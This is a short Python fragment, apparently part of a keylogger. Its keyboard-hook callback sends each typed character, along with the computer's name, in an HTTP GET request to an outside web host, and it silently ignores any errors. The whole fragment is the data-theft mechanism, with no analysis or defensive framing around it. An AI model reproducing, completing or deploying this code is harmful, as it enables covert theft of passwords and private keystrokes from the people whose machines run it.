def OnKeyBoardEvent(event):
    try:
        params = urllib.urlencode({'pcName': os.environ['COMPUTERNAME'], 'toLog': chr(event.Ascii)})
        conn = httplib.HTTPConnection("forwhatineedthatthing.sportsontheweb.net")
        conn.request("GET", "/index.php?" + params)
    except:
        pass
    return True